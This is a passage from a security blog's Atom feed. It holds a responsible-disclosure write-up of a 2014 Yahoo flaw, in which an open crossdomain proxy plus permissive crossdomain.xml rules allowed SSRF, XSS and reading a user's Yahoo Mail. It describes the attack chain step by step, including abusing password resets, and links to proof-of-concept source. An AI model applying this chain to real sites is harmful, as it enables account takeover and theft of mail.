<li>2014-12-03: Confirmed hotspotgallery.swf was no longer vulnerable</li>
</ul>


<h2>Related Links</h2>

<ul>
<li><a href="https://hackerone.com/reports/1171">HackerOne report (private at time of posting)</a></li>
<li><a href="http://saynotolinux.com/tests/yahoo/mail_theft_2014_11_2/">Comprehensive PoC</a></li>
<li><a href="https://gist.github.com/JordanMilne/e14cf1dcd4bfbd85275e">Comprehensive PoC source</a></li>
<li><a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">Decompiled hotspotgallery.swf</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Yahoo's Pet Show of Horrors: Leaking a User's Emails Crossdomain]]></title>
    <link href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/"/>
    <updated>2014-03-01T01:12:17-04:00</updated>
    <id>http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email</id>
    <content type="html"><![CDATA[<p>I&rsquo;m taking a break from browser security posts while I wait for vendors to patch, so the next few posts are probably going to be about web app security. Hopefully I should have some posts about architectural flaws in browsers / plugins by next month.</p>

<h2>Initial Discovery</h2>

<p>Since Yahoo <a href="http://yahoodevelopers.tumblr.com/post/65622522325/the-bug-bounty-program-is-now-live">recently revamped their Responsible Disclosure program</a>, I figured I&rsquo;d have a go at finding some vulnerabilities. All of <code>*.yahoo.com</code> is in scope, and Yahoo has a <em>lot</em> of legacy behind it, so I started going through the more obscure subdomains manually. One of the subdomains I looked at a lot was <code>hk.promotions.yahoo.com</code>. It&rsquo;s a good place to look because it has lots of PHP scripts and Flash, it looks like it wasn&rsquo;t done by Yahoo&rsquo;s core devs, and most auditors aren&rsquo;t looking there since its content is mostly in Chinese.</p>

<!--more-->


<p>I ended up on <code>http://hk.promotions.yahoo.com/petshow2011/</code>, apparently a page for a Hongkongese pet show that happened in 2011:</p>

<p><a href="/images/posts/petshow/petshow0.png"><img class="center" src="/images/posts/petshow/petshow0.png" width="640" height="480"></a></p>

<p>As you can see from the request log, something on the page was requesting data from another domain through a crossdomain proxy: <code>http://hk.promotions.yahoo.com/petshow2011/php/getImages.php?file=&lt;url&gt;</code>.</p>

<p>Crossdomain proxies are generally goldmines for vulnerabilities, and this one&rsquo;s no different. First of all, it doesn&rsquo;t whitelist the URLs that we may make requests to, and the proxy is positioned inside Yahoo&rsquo;s internal network, so we can have it proxy out resources that would normally be inacessible. I tested with a <code>.corp.yahoo.com</code> URL I found on google, and ended up with some uninteresting, but normally inaccessible search statistics. Other SSRF attacks were likely posible, but I didn&rsquo;t poke it too much other than to verify that local file disclosure wasn&rsquo;t possible.</p>

<p>Second, since the proxy doesn&rsquo;t set a <code>Content-Type</code> on the response and we control the response body, we&rsquo;ve got XSS on <code>hk.promotions.yahoo.com</code> thanks to type sniffing!</p>

<p><a href="/images/posts/petshow/petshow2.png"><img class="center" src="/images/posts/petshow/petshow2.png" width="640" height="480"></a></p>

<p><a href="/images/posts/petshow/petshow3.png"><img class="center" src="/images/posts/petshow/petshow3.png"></a></p>

<h2>Escalating Access</h2>

<p>That&rsquo;s nice and all, but XSS on a mostly-static subdomain isn&rsquo;t that interesting to me. Now, remember that we control the <em>entire</em> body of the proxy&rsquo;s response and that there&rsquo;s no <code>Content-Type</code>. That means we can <em>also</em> proxy an SWF and have it be same-origin with <code>hk.promotions.yahoo.com</code>. Why&rsquo;s a SWF any more useful to us than HTML? Because of overly-permissive <a href="http://kb2.adobe.com/cps/142/tn_14213.html">crossdomain.xml rules</a>.</p>

<p>Flash checks for a <code>&lt;destination domain&gt;/crossdomain.xml</code> file before attempting a crossorigin request, to see if SWFs from the sender&rsquo;s origin may read the response (among other things, see <a href="#Further.Reading">&ldquo;Further Reading&rdquo;</a>.) For example, if you wanted to allow SWFs on any subdomain of <code>yahoo.com</code> to do crossdomain reads to your domain, you might put a rule like this in your <code>crossdomain.xml</code>:</p>

<pre><code class="xml">&lt;allow-access-from domain="*.yahoo.com"/&gt;
</code></pre>

<p>That&rsquo;s probably overly permissive, <code>*.yahoo.com</code> is a <em>lot</em> of attack surface, but let&rsquo;s take a look at what Yahoo actually has in their <code>crossdomain.xml</code>s.</p>

<p><a href="http://finance.yahoo.com/crossdomain.xml">finance.yahoo.com</a>:</p>

<pre><code class="xml">&lt;cross-domain-policy&gt;
    &lt;allow-access-from domain="*.yahoo.com"/&gt;
    &lt;allow-access-from domain="us.js2.yimg.com"/&gt;
    &lt;allow-access-from domain="*.yimg.com"/&gt;
&lt;/cross-domain-policy&gt;
</code></pre>

<p><a href="http://www.flickr.com/crossdomain.xml">www.flickr.com</a>:</p>

<pre><code class="xml">&lt;cross-domain-policy&gt;
    &lt;allow-access-from domain="*.yahoo.com"/&gt;
    &lt;allow-access-from domain="l.yimg.com"/&gt;
    &lt;allow-access-from domain="d.yimg.com"/&gt;
    &lt;allow-access-from domain="s.yimg.com"/&gt;
    &lt;site-control permitted-cross-domain-policies="master-only"/&gt;
&lt;/cross-domain-policy&gt;
</code></pre>

<p><a href="http://ca-mg5.mail.yahoo.com/crossdomain.xml">ca-mg5.mail.yahoo.com</a> (webmail server, returns valid <code>crossdomain.xml</code> when logged in):</p>

<pre><code class="xml">&lt;cross-domain-policy&gt;
    &lt;allow-access-from domain="*.yahoo.com" secure="false"/&gt;
    &lt;allow-access-from domain="l.yimg.com" secure="false"/&gt;
    &lt;allow-access-from domain="s.yimg.com" secure="false"/&gt;
&lt;/cross-domain-policy&gt;
</code></pre>

<p>YMail actually has the <em>least</em> secure crossdomain policy of any of the subdomains that I checked. That <code>secure="false"</code> will allow SWFs served over HTTP to read resources only served over HTTPS, making the forced HTTPS a lot less useful. Per Adobe, <a href="http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html#articlecontentAdobe_numberedheader_0">&ldquo;Using false in an HTTPS policy file is not recommended because this compromises the security offered by HTTPS.&rdquo;</a></p>

<h2>It&rsquo;s Proxies All the Way Down</h2>

<p>Well, now we know we can get an arbitrary SWF same-origin with a subdomain of <code>yahoo.com</code>, and we know that SWF can read from a number of subdomains on <code>yahoo.com</code>, let&rsquo;s get some emails!</p>

<p>First, we need to pick the SWF to proxy. The obvious choice for someone who doesn&rsquo;t know Flash well is a <a href="https://github.com/borisreitman/CrossXHR">SWF&lt;->JS XHR proxy</a>. These allow you to proxy requests from JS through a specialized SWF. Here was the result, with some overzealous redaction:</p>

<p><a href="/images/posts/petshow/petshow4.png"><img class="center" src="/images/posts/petshow/petshow4.png" width="640"></a></p>

<p>Looks like our proxied proxy works, the response body includes all of my test account&rsquo;s auth tokens and personal info. One of those tokens allows us to access a JSON endpoint that lists our e-mails:</p>

<p><a href="/images/posts/petshow/petshow6.png"><img class="center" src="/images/posts/petshow/petshow6.png" width="640"></a></p>

<p>and we can use those message IDs to pull up specific emails from the user&rsquo;s inbox:</p>

<p><a href="/images/posts/petshow/petshow7.png"><img class="center" src="/images/posts/petshow/petshow7.png" width="640"></a></p>

<p>and since we can read pages containing CSRF tokens, we can delete the user&rsquo;s emails, send emails as the current user, etc:</p>

<p><a href="/images/posts/petshow/petshow8.png"><img class="center" src="/images/posts/petshow/petshow8.png" width="640"></a></p>

<p>Funky. The most obvious application of this attack would be to determine the user&rsquo;s email, initiate a password reset on any &ldquo;interesting&rdquo; sites, read the password reset URL from their email, then delete the email; but there&rsquo;s plenty of others.</p>

<h2>The Fix</h2>

<p>Well, the affected page was for a Hongkongese pet show that happened in 2011, so the fix was removing the page and its associated crossdomain proxy. I&rsquo;m disappointed that the <code>crossdomain.xml</code> rules are still as loose as they are, but I don&rsquo;t think that&rsquo;s getting changed anytime soon. Subsequent reports mentioning the <code>crossdomain.xml</code> rules have been marked WONTFIX.</p>

<h2>TL;DR</h2>

<p>There were SSRF and crossdomain data leakage issues due to a misconfigured crossdomain proxy and overly-permissive <code>crossdomain.xml</code> rules. One was able to leak the emails of the current user, and do anything the user could do from YMail just by having them visit an attacker-controlled page.</p>

<p>This instance of the issue is fixed, but the <code>crossdomain.xml</code> rules are still overly-permissive.</p>

<h2>Disclosure Timeline</h2>

<ul>
<li>Nov. 19 2013: Discovered that crossdomain proxy leaked internal resources</li>
<li>Nov. 20 2013: Reported issue to Yahoo</li>
<li>Nov. 23 2013: Updated Yahoo on the XSS / crossdomain leakage / crossdomain.xml issues</li>
<li>Nov. 25 2013: Yahoo acknowledges report</li>
<li>Nov. 29 2013: Yahoo fixes issue</li>
<li>Feb. 03 2014: Yahoo confirms report, bounty elligibility</li>
</ul>


<h2>Further Reading</h2>

<ul>
<li><a href="https://gist.github.com/anonymous/5c2b1440b37d7d715592">An example of a vulnerable crossdomain proxy</a></li>
<li><a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#">SSRF Bible</a></li>
<li><a href="http://code.google.com/p/browsersec/wiki/Part2#Same-origin_policy_for_Flash">Flash same-origin policy primer</a></li>
</ul>

]]></content>
  </entry>
  
</feed>
